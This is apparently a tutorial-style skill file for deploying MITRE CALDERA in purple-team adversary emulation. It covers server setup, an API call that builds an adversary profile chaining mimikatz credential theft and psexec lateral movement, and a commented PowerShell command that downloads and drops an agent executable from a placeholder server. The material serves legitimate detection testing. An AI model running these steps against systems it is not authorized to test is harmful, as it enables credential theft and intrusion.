<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: implementing-caldera-operations
description: >-
  Deploy and operate MITRE CALDERA for automated adversary emulation, configure
  abilities and adversary profiles, execute operations against target environments,
  and collect detection telemetry for purple team assessments.
domain: cybersecurity
subdomain: adversary-simulation
tags:
  - caldera
  - adversary-emulation
  - automated-testing
  - mitre-attack
  - purple-team
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1059", "T1053", "T1071"]
  frameworks: ["MITRE CALDERA", "MITRE ATT&CK"]
  tools: ["python3", "docker", "caldera", "curl"]
---

# Implementing CALDERA Operations

## Overview

MITRE CALDERA is an automated adversary emulation platform that executes
ATT&CK-mapped techniques against target systems. Operations are composed of
abilities (individual techniques) grouped into adversary profiles that simulate
realistic attack chains with intelligent decision-making.

## Prerequisites

- Tools: `python3`, `docker`, `curl`
- CALDERA server deployed (Docker or native)
- Agent deployed on target systems (Sandcat, Manx, or Ragdoll)
- Network connectivity between CALDERA server and agents

## Workflow

### Step 1: Deploy CALDERA Server

```bash
# Deploy via Docker
docker run -d --name caldera -p 8888:8888 -p 7010:7010 mitre/caldera:latest

# Verify server is running
curl -s http://localhost:8888/api/v2/health | python3 -m json.tool
```

### Step 2: Configure Adversary Profile

```python
import requests

CALDERA_URL = "http://localhost:8888"
API_KEY = "ADMIN123"  # Replace with actual key
HEADERS = {"KEY": API_KEY, "Content-Type": "application/json"}

# Create adversary profile
adversary = {
    "name": "Custom APT Emulation",
    "description": "Emulates targeted intrusion lifecycle",
    "atomic_ordering": [
        "discovery-whoami",
        "discovery-hostname",
        "credential-mimikatz",
        "lateral-psexec",
    ],
}
resp = requests.post(
    f"{CALDERA_URL}/api/v2/adversaries",
    json=adversary,
    headers=HEADERS,
)
print(resp.json())
```

### Step 3: Deploy Agents and Execute

```bash
# Deploy Sandcat agent on target (PowerShell)
# server="http://CALDERA_IP:8888";
# $url="$server/file/download";
# $wc=New-Object System.Net.WebClient;
# $wc.Headers.add("platform","windows");
# $wc.Headers.add("file","sandcat.go");
# $output="C:\Users\Public\sandcat.exe";
# $wc.DownloadFile($url,$output);

# Launch operation via API
python3 scripts/agent.py run-operation --adversary "Custom APT Emulation" --group "target-group"
```

### Step 4: Collect Results

```bash
# Export operation results
python3 scripts/agent.py export-results --operation-id "OP_ID" --format json

# Generate detection coverage report
python3 scripts/agent.py detection-report --operation-id "OP_ID"
```

## Verification

- [ ] CALDERA server deployed and accessible
- [ ] Agents reporting to server from target systems
- [ ] Adversary profile configured with correct abilities
- [ ] Operation executed with all abilities attempted
- [ ] Results exported with detection timestamps

## References

- [MITRE CALDERA Documentation](https://caldera.readthedocs.io/) — Official docs
- [CALDERA Stockpile](https://github.com/mitre/stockpile) — Ability plugin library
